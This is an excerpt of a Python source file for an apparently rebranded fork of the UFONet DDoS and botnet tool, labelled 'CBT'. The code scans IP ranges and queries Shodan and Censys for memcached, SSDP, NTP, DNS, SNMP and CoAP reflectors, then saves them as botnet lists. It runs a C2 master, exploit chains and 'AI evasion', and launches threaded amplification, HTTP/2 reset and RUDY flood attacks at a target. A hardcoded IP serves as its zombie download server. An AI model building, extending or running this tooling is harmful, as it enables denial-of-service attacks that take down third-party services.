...
try:
    ...
    print ("\n[Error] CBT no longer supports Python2: (https://www.python.org/doc/sunset-python-2/)\n\n[Info] [AI] Try to run the tool with Python3.x.y (ex: python3 ufonet)\n")
    sys.exit()
...
from core.tools.scanner import AutoScanner
from core.tools.shodan_scanner import ShodanScanner, CensysScanner
from core.tools.auto_discover import AutoDiscover
from core.tools.intelligence import IntelligenceGatherer
from core.tools.exploit_chain import ExploitChainBuilder
from core.tools.report_generator import ReportGenerator
from core.ai.coordinator import AICoordinator
from core.ai.evasion import AIEvasion
from core.ai.advanced_evasion import AdvancedEvasion
from core.ml.optimizer import MLAttackOptimizer
from core.c2.master import C2Master
from core.c2.slave import C2Slave
from core.cloud.attacks import CloudAttacker
from core.covert.steganography import Steganography
from core.p2p.network import P2PNode
from core.dashboard.server import DashboardServer
...
from core.mods.http2reset import HTTP2RESET
from core.mods.http2zerowin import HTTP2ZEROWIN
from core.mods.rudy import RUDY
...
class UFONet(object):
    def __init__(self):
        self.exit_msg = 'CBT (Core Brim Tech) - https://www.corebrimtech.com' # set msg show at the end [FILO ;-)]
        self.blackhole = '46.163.118.220' # default download/upload zombies [Blackhole] [Server] / Try [DIY] your own [Mirror]...
        self.crypto_key = "CBT-CORE!" # default cryptkey
        self.GIT_REPOSITORY = 'https://www.corebrimtech.com/cbt' # oficial code source
        self.GIT_REPOSITORY2 = 'https://github.com/corebrimtech/cbt' # mirror source
        self.github_zombies = 'https://raw.githubusercontent.com/corebrimtech/cbt/master/botnet/' # default [RAW] download/upload zombies [Blackhole] [GitHub] [DIY]
        ...
        self.warping_path = '/var/www/cbt' # set source for warping path
        ...
        self.total_sniper = 0
        self.total_memcached = 0
        self.total_ssdp = 0
        self.total_chargen = 0
        self.total_http2reset = 0
        self.total_http2zerowin = 0
        self.total_rudy = 0
        self.total_coap = 0
    ...
    def banner_welcome(self):
        ...
        print(r"    .'_.-|            YY            |-._'.      ||                                             ||")
        print(r"                                                ||  -> [ CBT: https://www.corebrimtech.com ] <-  ||") 
    ...
    def generate_exit_msg(self):
        ...
        try:
            ...
            self.exit_msg += " -> CBT (Core Brim Tech) - https://www.corebrimtech.com" 
    ...
    def checkeuid(self):
        try:
            ...
            print("[Error] [AI] [CBT] doesn't work correctly in systems with closed licenses...-> [Exiting!]\n")
    ...
    def run(self, opts=None):
        ...
        if options.cryptomsg:
            ...
            print(r"    ''''''''''''''''''''''''''''''''''''''  ")
            print(r"     + CBT Crypter (AES256+HMAC-SHA1)")
        ...
        if options.target:
            try:
                ...
                # AI Coordination
                if options.ai_coordinate:
                    coordinator = AICoordinator(self)
                    plan = coordinator.coordinate_multi_phase_attack(options.target)
                    print(f"[Info] [AI] [Coordinator] Executing AI-generated attack plan...\n")
                
                # AI Evasion
                if options.ai_evade:
                    evasion = AIEvasion(self)
                    print("[Info] [AI] [Evasion] AI evasion enabled\n")
                
                # Advanced Evasion
                if options.advanced_evasion:
                    advanced_evasion = AdvancedEvasion(self)
                    print("[Info] [AI] [Evasion] Advanced evasion engine enabled\n")
                
                # ML Optimization
                if options.ml_optimize:
                    ml_optimizer = MLAttackOptimizer(self)
                    print("[Info] [AI] [ML] ML attack optimization enabled\n")
        ...
        # AI Analysis
        if options.ai_analyze:
            try:
                self.banner()
                print("\n[Info] [AI] [Coordinator] Analyzing target...\n")
                coordinator = AICoordinator(self)
                analysis = coordinator.analyze_target(options.ai_analyze)
                print(f"[Info] [AI] [Coordinator] Best attacks: {', '.join(analysis['best_attacks'])}")
                print(f"[Info] [AI] [Coordinator] Estimated success: {analysis['estimated_success']*100:.1f}%")
                print(f"[Info] [AI] [Coordinator] Recommended rounds: {analysis['recommended_rounds']}")
                print(f"[Info] [AI] [Coordinator] Attack pattern: {analysis['attack_pattern']}\n")
            except Exception as e:
        ...
        # Scanner Tools
        if options.scan_all or options.scan_memcached or options.scan_ssdp or options.scan_chargen or options.scan_ntp or options.scan_dns or options.scan_snmp or options.scan_coap:
            try:
                self.banner()
                scanner = AutoScanner(self)
                if options.scan_all:
                    ip_range = options.scan_all.split('-')
                    if len(ip_range) == 2:
                        print(f"\n[Info] [AI] [Scanner] Scanning IP range: {ip_range[0]} to {ip_range[1]}\n")
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'all')
                        scanner.save_results()
                        print(f"\n[Info] [AI] [Scanner] Scan complete. Results saved to botnet files.\n")
                elif options.scan_memcached:
                    ip_range = options.scan_memcached.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'memcached')
                        scanner.save_results()
                elif options.scan_ssdp:
                    ip_range = options.scan_ssdp.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'ssdp')
                        scanner.save_results()
                elif options.scan_chargen:
                    ip_range = options.scan_chargen.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'chargen')
                        scanner.save_results()
                elif options.scan_ntp:
                    ip_range = options.scan_ntp.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'ntp')
                        scanner.save_results()
                elif options.scan_dns:
                    ip_range = options.scan_dns.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'dns')
                        scanner.save_results()
                elif options.scan_snmp:
                    ip_range = options.scan_snmp.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'snmp')
                        scanner.save_results()
                elif options.scan_coap:
                    ip_range = options.scan_coap.split('-')
                    if len(ip_range) == 2:
                        results = scanner.scan_ip_range(ip_range[0], ip_range[1], 'coap')
                        scanner.save_results()
            except Exception as e:
                print(f"\n[Error] [AI] Scanner failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()

        # Shodan/Censys Integration
        if options.shodan_memcached or options.shodan_ssdp or options.shodan_all:
            try:
                self.banner()
                api_key = options.shodan_key or os.getenv('SHODAN_API_KEY')
                if not api_key:
                    print("\n[Error] [AI] Shodan API key required. Set --shodan-key or SHODAN_API_KEY env var\n")
                else:
                    shodan_scanner = ShodanScanner(api_key)
                    if options.shodan_memcached:
                        results = shodan_scanner.search_memcached(100)
                        shodan_scanner.save_results(results, 'botnet/memcacheds.txt')
                    elif options.shodan_ssdp:
                        results = shodan_scanner.search_ssdp(100)
                        shodan_scanner.save_results(results, 'botnet/ssdps.txt')
                    elif options.shodan_all:
                        print("\n[Info] [AI] [Shodan] Searching for all vulnerable services...\n")
                        memcached = shodan_scanner.search_memcached(100)
                        shodan_scanner.save_results(memcached, 'botnet/memcacheds.txt')
                        ssdp = shodan_scanner.search_ssdp(100)
                        shodan_scanner.save_results(ssdp, 'botnet/ssdps.txt')
                        ntp = shodan_scanner.search_ntp(100)
                        shodan_scanner.save_results(ntp, 'botnet/ntp.txt')
                        dns = shodan_scanner.search_dns(100)
                        shodan_scanner.save_results(dns, 'botnet/dns.txt')
                        snmp = shodan_scanner.search_snmp(100)
                        shodan_scanner.save_results(snmp, 'botnet/snmp.txt')
                        coap = shodan_scanner.search_coap(100)
                        shodan_scanner.save_results(coap, 'botnet/coaps.txt')
                        print(f"\n[Info] [AI] [Shodan] Discovery complete!\n")
            except Exception as e:
                print(f"\n[Error] [AI] Shodan search failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()

        # Censys Integration
        if options.censys_memcached or options.censys_all:
            try:
                self.banner()
                api_id = options.censys_id or os.getenv('CENSYS_API_ID')
                api_secret = options.censys_secret or os.getenv('CENSYS_API_SECRET')
                if not api_id or not api_secret:
                    print("\n[Error] [AI] Censys API credentials required. Set --censys-id/--censys-secret or env vars\n")
                else:
                    censys_scanner = CensysScanner(api_id, api_secret)
                    if options.censys_memcached:
                        results = censys_scanner.search_memcached(100)
                        censys_scanner.save_results(results, 'botnet/memcacheds.txt')
                    elif options.censys_all:
                        print("\n[Info] [AI] [Censys] Searching for all vulnerable services...\n")
                        memcached = censys_scanner.search_memcached(100)
                        censys_scanner.save_results(memcached, 'botnet/memcacheds.txt')
                        ssdp = censys_scanner.search_ssdp(100)
                        censys_scanner.save_results(ssdp, 'botnet/ssdps.txt')
                        print(f"\n[Info] [AI] [Censys] Discovery complete!\n")
            except Exception as e:
                print(f"\n[Error] [AI] Censys search failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()
        ...
        if options.auto_discover:
            try:
                self.banner()
                discover = AutoDiscover(self)
                api_key = options.shodan_key or os.getenv('SHODAN_API_KEY')
                if api_key:
                    discover.setup_shodan(api_key)
                api_id = options.censys_id or os.getenv('CENSYS_API_ID')
                api_secret = options.censys_secret or os.getenv('CENSYS_API_SECRET')
                if api_id and api_secret:
                    discover.setup_censys(api_id, api_secret)
                
                service_type = options.auto_discover.lower()
                if service_type == 'memcached':
                    results = discover.discover_memcached()
                    print(f"\n[Info] [AI] [AutoDiscover] Found {len(results)} Memcached servers\n")
                elif service_type == 'all':
                    results = discover.discover_all()
                    print(f"\n[Info] [AI] [AutoDiscover] Discovery complete!\n")
                else:
                    print(f"\n[Error] [AI] Unknown service type: {service_type}\n")
            except Exception as e:
                print(f"\n[Error] [AI] Auto-discover failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()
        ...
        if options.intelligence:
            try:
                self.banner()
                intel = IntelligenceGatherer(self)
                report = intel.gather_all(options.intelligence)
                print("\n" + intel.generate_report(options.intelligence))
            except Exception as e:
                print(f"\n[Error] [AI] Intelligence gathering failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()

        # C2 Master
        if options.c2_master:
            try:
                self.banner()
                c2_master = C2Master(self, options.c2_master)
                print(f"\n[Info] [AI] [C2] Starting master node on port {options.c2_master}\n")
                c2_master.start()
            except Exception as e:
                print(f"\n[Error] [AI] C2 master failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()

        # Cloud Attacks
        if options.cloud_attack:
            try:
                self.banner()
                cloud = CloudAttacker(self)
                provider = cloud.detect_cloud_provider(options.cloud_attack)
                print(f"\n[Info] [AI] [Cloud] Detected provider: {provider}\n")
                if provider == 'aws':
                    attacks = cloud.aws_amplification(options.cloud_attack)
                elif provider == 'azure':
                    attacks = cloud.azure_attacks(options.cloud_attack)
                elif provider == 'gcp':
                    attacks = cloud.gcp_attacks(options.cloud_attack)
                else:
                    attacks = []
                print(f"[Info] [AI] [Cloud] Found {len(attacks)} attack vectors\n")
            except Exception as e:
                print(f"\n[Error] [AI] Cloud attack failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()

        # Exploit Chain
        if options.exploit_chain:
            try:
                self.banner()
                chain_builder = ExploitChainBuilder(self)
                intel = IntelligenceGatherer(self)
                target_info = intel.gather_all(options.exploit_chain)
                vulns = chain_builder.identify_vulnerabilities(target_info)
                chain = chain_builder.build_exploit_chain(options.exploit_chain, vulns)
                print(f"\n[Info] [AI] [Exploit] Built chain with {len(chain['steps'])} steps\n")
                chain_builder.execute_chain(chain)
            except Exception as e:
                print(f"\n[Error] [AI] Exploit chain failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()
        ...
        if options.dashboard:
            try:
                self.banner()
                dashboard = DashboardServer(self, options.dashboard)
                dashboard.start()
                print(f"\n[Info] [AI] [Dashboard] Dashboard running on http://0.0.0.0:{options.dashboard}\n")
                print("[Info] [AI] [Dashboard] Press Ctrl+C to stop\n")
                import signal
        ...
        if options.generate_report:
            try:
                self.banner()
                report_gen = ReportGenerator(self)
                # Collect attack data (simplified)
                attack_data = {
                    'target': 'example.com',
                    'duration': '1 hour',
                    'total_attacks': 100,
                ...
                if options.generate_report.endswith('.html'):
                    report_gen.generate_html_report(attack_data, options.generate_report)
                elif options.generate_report.endswith('.json'):
                    report_gen.generate_json_report(attack_data, options.generate_report)
                elif options.generate_report.endswith('.md'):
                    report_gen.generate_markdown_report(attack_data, options.generate_report)
            except Exception as e:
                print(f"\n[Error] [AI] Report generation failed: {e}\n")
                if DEBUG == True:
                    traceback.print_exc()
        ...
        # deploy data to share in [/var/www/cbt]
        if options.deploy is not None:
            ...
            try:
                ...
                print("[Error] "+str(e))
                print("\n[AI] Something was wrong deploying in: '/var/www/cbt'... -> [Aborting!]\n")
    ...
    def update_memcached_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "memcached" not in data:
            data["memcached"] = "0"
        amemcached = data["memcached"]
        amemcached = str(int(amemcached) + 1) # add new memcached attack to recorded stats
        self.total_memcached = self.total_memcached + 1 # add new memcached attack to session stats
        data["memcached"] = amemcached
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_ssdp_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "ssdp" not in data:
            data["ssdp"] = "0"
        assdp = data["ssdp"]
        assdp = str(int(assdp) + 1) # add new ssdp attack to recorded stats
        self.total_ssdp = self.total_ssdp + 1 # add new ssdp attack to session stats
        data["ssdp"] = assdp
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_chargen_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "chargen" not in data:
            data["chargen"] = "0"
        achargen = data["chargen"]
        achargen = str(int(achargen) + 1) # add new chargen attack to recorded stats
        self.total_chargen = self.total_chargen + 1 # add new chargen attack to session stats
        data["chargen"] = achargen
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_http2reset_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "http2reset" not in data:
            data["http2reset"] = "0"
        ahttp2reset = data["http2reset"]
        ahttp2reset = str(int(ahttp2reset) + 1) # add new http2reset attack to recorded stats
        self.total_http2reset = self.total_http2reset + 1 # add new http2reset attack to session stats
        data["http2reset"] = ahttp2reset
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_http2zerowin_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "http2zerowin" not in data:
            data["http2zerowin"] = "0"
        ahttp2zerowin = data["http2zerowin"]
        ahttp2zerowin = str(int(ahttp2zerowin) + 1) # add new http2zerowin attack to recorded stats
        self.total_http2zerowin = self.total_http2zerowin + 1 # add new http2zerowin attack to session stats
        data["http2zerowin"] = ahttp2zerowin
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_rudy_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "rudy" not in data:
            data["rudy"] = "0"
        arudy = data["rudy"]
        arudy = str(int(arudy) + 1) # add new rudy attack to recorded stats
        self.total_rudy = self.total_rudy + 1 # add new rudy attack to session stats
        data["rudy"] = arudy
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()

    def update_coap_stats(self):
        stats_json_file = open(self.mothership_stats_file, "r")
        data = json.load(stats_json_file)
        stats_json_file.close()
        if "coap" not in data:
            data["coap"] = "0"
        acoap = data["coap"]
        acoap = str(int(acoap) + 1) # add new coap attack to recorded stats
        self.total_coap = self.total_coap + 1 # add new coap attack to session stats
        data["coap"] = acoap
        stats_json_file = open(self.mothership_stats_file, "w+")
        stats_json_file.write(json.dumps(data))
        stats_json_file.close()
    ...
    def aiming_extra_weapons(self, target, proxy, loic, loris, ufosyn, spray, smurf, fraggle, xmas, ufoack, uforst, droper, overlap, pinger, ufoudp, nuke, tachyon, monlist, sniper, memcached, ssdp, chargen, http2reset, http2zerowin, rudy, coap):
        ...
        if memcached:
            try:
                self.options.memcached = int(memcached)
            except:
                self.options.memcached = 100 # default MEMCACHED requests
            if self.options.memcached < 1:
                self.options.memcached = 100
            self.instance = MEMCACHED() # instance main class for MEMCACHED operations
            self.t19 = threading.Thread(target=self.instance.attacking, args=(target, self.options.memcached)) # MEMCACHED using threads
            self.t19.daemon = True
            self.t19.start()
            self.update_memcached_stats() # add new MEMCACHED attack to mothership stats
        if ssdp:
            try:
                self.options.ssdp = int(ssdp)
            except:
                self.options.ssdp = 100 # default SSDP requests
            if self.options.ssdp < 1:
                self.options.ssdp = 100
            self.instance = SSDP() # instance main class for SSDP operations
            self.t20 = threading.Thread(target=self.instance.attacking, args=(target, self.options.ssdp)) # SSDP using threads
            self.t20.daemon = True
            self.t20.start()
            self.update_ssdp_stats() # add new SSDP attack to mothership stats
        if chargen:
            try:
                self.options.chargen = int(chargen)
            except:
                self.options.chargen = 100 # default CHARGEN requests
            if self.options.chargen < 1:
                self.options.chargen = 100
            self.instance = CHARGEN() # instance main class for CHARGEN operations
            self.t21 = threading.Thread(target=self.instance.attacking, args=(target, self.options.chargen)) # CHARGEN using threads
            self.t21.daemon = True
            self.t21.start()
            self.update_chargen_stats() # add new CHARGEN attack to mothership stats
        if http2reset:
            try:
                self.options.http2reset = int(http2reset)
            except:
                self.options.http2reset = 100 # default HTTP2RESET requests
            if self.options.http2reset < 1:
                self.options.http2reset = 100
            self.instance = HTTP2RESET() # instance main class for HTTP2RESET operations
            self.t22 = threading.Thread(target=self.instance.attacking, args=(target, self.options.http2reset)) # HTTP2RESET using threads
            self.t22.daemon = True
            self.t22.start()
            self.update_http2reset_stats() # add new HTTP2RESET attack to mothership stats
        if http2zerowin:
            try:
                self.options.http2zerowin = int(http2zerowin)
            except:
                self.options.http2zerowin = 100 # default HTTP2ZEROWIN requests
            if self.options.http2zerowin < 1:
                self.options.http2zerowin = 100
            self.instance = HTTP2ZEROWIN() # instance main class for HTTP2ZEROWIN operations
            self.t23 = threading.Thread(target=self.instance.attacking, args=(target, self.options.http2zerowin)) # HTTP2ZEROWIN using threads
            self.t23.daemon = True
            self.t23.start()
            self.update_http2zerowin_stats() # add new HTTP2ZEROWIN attack to mothership stats
        if rudy:
            try:
                self.options.rudy = int(rudy)
            except:
                self.options.rudy = 101 # default RUDY requests
            if self.options.rudy < 1:
                self.options.rudy = 101
            self.instance = RUDY() # instance main class for RUDY operations
            self.t24 = threading.Thread(target=self.instance.attacking, args=(target, self.options.rudy)) # RUDY using threads
            self.t24.daemon = True
            self.t24.start()
            self.update_rudy_stats() # add new RUDY attack to mothership stats
        if coap:
            try:
                self.options.coap = int(coap)
            except:
                self.options.coap = 100 # default COAP requests
            if self.options.coap < 1:
                self.options.coap = 100
            self.instance = COAP() # instance main class for COAP operations
            self.t25 = threading.Thread(target=self.instance.attacking, args=(target, self.options.coap)) # COAP using threads
            self.t25.daemon = True
            self.t25.start()
            self.update_coap_stats() # add new COAP attack to mothership stats
    ...
    def injection(self, target, zombies, head_check = True):
        ...
        if head_check_here == True or head_check_external == True:
            ...
            if start_reply == "y" or start_reply == "Y":
                ...
                if options.loic or options.loris or options.ufosyn or options.spray or options.smurf or options.fraggle or options.xmas or options.ufoack or options.uforst or options.droper or options.overlap or options.pinger or options.ufoudp or options.nuke or options.tachyon or options.monlist or options.sniper or options.memcached or options.ssdp or options.chargen or options.http2reset or options.http2zerowin or options.rudy or options.coap:
                    ex = threading.Thread(target=self.aiming_extra_weapons, args=(target, self.options.proxy, self.options.loic, self.options.loris, self.options.ufosyn, self.options.spray, self.options.smurf, self.options.fraggle, self.options.xmas, self.options.ufoack, self.options.uforst, self.options.droper, self.options.overlap, self.options.pinger, self.options.ufoudp, self.options.nuke, self.options.tachyon, self.options.monlist, self.options.sniper, self.options.memcached, self.options.ssdp, self.options.chargen, self.options.http2reset, self.options.http2zerowin, self.options.rudy, self.options.coap)) # multithreading flow for extra attacks
